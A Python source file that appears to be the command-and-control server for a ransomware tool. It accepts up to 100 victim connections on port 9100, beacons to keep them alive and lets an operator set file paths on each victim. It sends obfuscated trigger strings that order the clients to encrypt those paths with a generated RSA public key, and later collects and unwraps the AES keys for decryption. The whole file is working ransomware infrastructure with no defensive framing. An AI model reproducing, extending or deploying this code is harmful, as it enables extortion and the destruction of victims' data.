#!/usr/bin/python3

import socket
import time
import threading
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
#import py7zr
import multivolumefile
import shutil
import os
import gzip
import io
from sys import exit

# Dictionary to store client variables
clientDict = {}

# Client key count
clientNo = 0

# Variable to store initial state of user input as none
choice = None

pause = False


class Server_AES_Encrypt_File:

    def export_rsa_key(self):
        def export(key, filename):
            with open(filename, "wb") as file:
                file.write(key.exportKey('PEM'))
                file.close()

        def imports(filename):
            with open(filename, "rb") as file:
                key = RSA.importKey(file.read())
            return key

        if not (os.path.isfile('private_key.pem') and os.path.isfile('public_key.pem')):
            keypair = RSA.generate(4096)
            public_key = keypair.publickey()

            export(keypair, 'private_key.pem')
            export(public_key, 'public_key.pem')

        # pub_key = imports('public_key.pem')

        with open("public_key.pem", "rb") as file:
            pub_key = file.read()

        return pub_key

    def main(self):
        print("[+] Creating RSA Key Pairs")
        key = self.export_rsa_key()
        print("[+] Complete!!")
        return key


class Server_AES_Decrypt_File:
    def __init__(self, keys_path):
        self.private_key = None
        self.keys_path = keys_path

    def import_private_key(self):
        with open("private_key.pem", "rb") as file:
            key = RSA.importKey(file.read())

            self.private_key = key

    def decrypt_with_rsa(self, file_path):

        file = open(file_path, "rb")
        data = file.read()
        file.close()

        decryptor = PKCS1_OAEP.new(self.private_key)
        decrypted = decryptor.decrypt(data)

        file = open(file_path, "wb")
        file.write(decrypted)
        file.close()

    def rsa_run_decrypt(self):
        path_d = []

        for directory in os.walk(self.keys_path):
            path_d.append(directory)

        for key in path_d[0][-1]:
            self.decrypt_with_rsa(path_d[0][0] + key)

    def aes_key_retrieve(self, retrieve_type):
        if retrieve_type == 1:
            # either use (os.mkdir("keys") to os.rmdir("keys/key") for server or just use py7zr

            # with py7zr.SevenZipFile("key", 'r') as archive:
            #     archive.extractall()

            os.mkdir(self.keys_path)
            shutil.unpack_archive("key", f"{self.keys_path}key", "zip")
            for file_name in os.listdir(f"{self.keys_path}key/keys"):
                shutil.move(os.path.join(f"{self.keys_path}/key/keys", file_name), "keys")
            shutil.rmtree(f"{self.keys_path}/key")


        else:
            # either use gzip for both server and client or just use py7zr

            with multivolumefile.open(self.keys_path + 'aes_keys_archive', mode='rb') as target_archive:
                with gzip.open(target_archive, 'rb') as ip:
                    with io.TextIOWrapper(ip, encoding='utf-8') as decoder:
                        # Let's read the content using read()
                        content = decoder.read()
                        open("aes_keys", "w").write(content)

            # with multivolumefile.open(self.keys_path + 'aes_keys_archive', mode='rb') as target_archive:
            #     with py7zr.SevenZipFile(target_archive, 'r') as archive:
            #         archive.extractall()

            shutil.rmtree(self.keys_path)
            os.remove("key")

    def main(self):
        self.import_private_key()
        print("[+] Extracting Keys")
        self.aes_key_retrieve(1)
        print("[+] Decrypting Keys")
        self.rsa_run_decrypt()
        print("[+] Complete!!")
        self.aes_key_retrieve(2)


# Function to set path of encryption
def clientChoose(choiceInt):
    global pause

    if choiceInt in clientDict:
        pause = True

        while True:
            path = ""
            while path == "":
                path = input(f"Set path for client {choiceInt} : ")

            if path == "Exit":
                break

            try:
                clientDict[choiceInt][2].send(b'D@nC1nGM0nK3yPATHdjShankeyShoe')
                clientDict[choiceInt][2].send(path.encode('utf-8'))
                reply = clientDict[choiceInt][2].recv(9999)
            except:
                print("Client Disconnected")
                time.sleep(2)
                break

            if reply == b'Error':
                print("Wrong path, please enter again :)")
            elif reply == b'Exists':
                print("Valid Path.")

                if len(clientDict[choiceInt]) == 4:
                    del clientDict[choiceInt][-1]

                clientDict[choiceInt].append(path)
                time.sleep(2)
                break
    else:
        print("Invalid Client")
        time.sleep(2)

    client_print()
    pause = False


# Function that prints out the list of clients in table form
def client_print():
    print("\n" * 70)
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

    if clientDict:
        result = "{:<8} {:<15} {:<10}".format('Client', 'Address', 'Port')
        for keys in clientDict:
            result += "\n{:<8} {:<15} {:<10}".format(keys, clientDict[keys][0], clientDict[keys][1])
        result += "\n\n> Choose Client [1-x] \n> Encrypt\n> Decrypt\n\nChoice: "

        print(result, end="")

    else:
        print("No device found. Socket is listening...")


# Function to process user input
def phase_1():
    while True:
        global choice, pause

        choice = None
        choice = input("")

        if choice.isnumeric():
            clientChoose(choice)

        else:
            if choice == "Encrypt":
                setPath = True

                for key in list(clientDict):
                    if len(clientDict[key]) != 4:
                        print("Path for Client " + key + " is not set")
                        setPath = False
                time.sleep(2)

                if setPath:
                    pause = True
                    pubs_key = Server_AES_Encrypt_File().main()
                    for key in list(clientDict):
                        try:
                            clientDict[key][2].send(b'B!GP0ndENCRYPTsmallFishZY')
                            time.sleep(0.3)

                            clientDict[key][2].send(pubs_key + b'@@Encrypt@@' + clientDict[key][-1].encode('utf-8'))
                            del clientDict[key][-1]
                            time.sleep(2)
                        except:
                            print(f"Client {key} Disconnected")
                            time.sleep(2)

                    pause = False

            elif choice == "Decrypt":
                pause = True

                for key in list(clientDict):
                    try:
                        clientDict[key][2].send(b'y3sD@DDyDECRYPTBigPaPaYJ')

                        data = b''
                        while True:
                            reply = clientDict[key][2].recv(9999)
                            print("[+] Receiving Keys\n")
                            if reply == b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN':
                                break
                            else:
                                data += reply

                        file = open('key', 'wb')
                        file.write(data)
                        file.close()
                        Server_AES_Decrypt_File("keys/").main()

                        file = open('aes_keys', 'rb')
                        keyfile = file.read()
                        file.close()
                        clientDict[key][2].send(keyfile)
                        time.sleep(0.5)
                        clientDict[key][2].send(b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN')

                    except:
                        print(f"Client {key} Disconnected")
                        time.sleep(2)

                os.remove('aes_keys')
                pause = False


            elif choice == "Quit":
                exit()

            else:
                print("Invalid option, please enter again :)")
                time.sleep(1)

            client_print()


# Function to establish socket connection
def socketConn():
    global clientDict, clientNo
    # Reserve a port for service.
    port = 9100
    ip = ""

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind to the port
    s.bind((ip, port))
    # Wait for client connection. 100 clients
    s.listen(100)
    client_print()

    while True:
        # Establish connection with client.
        client, address = s.accept()
        # Adds one to variable clientNo and add connection to the clientDict dictionary
        clientNo += 1
        clientDict[str(clientNo)] = [address[0], address[1], client]

        if not pause:
            client_print()


def beacon():
    while True:
        if not pause:
            for key in list(clientDict):
                client = clientDict[key][2]

                try:
                    client.send(b'beacon')
                    client.settimeout(4)
                    client.recv(2048)

                except:
                    del clientDict[key]
                    client_print()

        time.sleep(15)


connect = threading.Thread(target=socketConn)
reply = threading.Thread(target=phase_1)
c2 = threading.Thread(target=beacon)

connect.start()
reply.start()
c2.start()
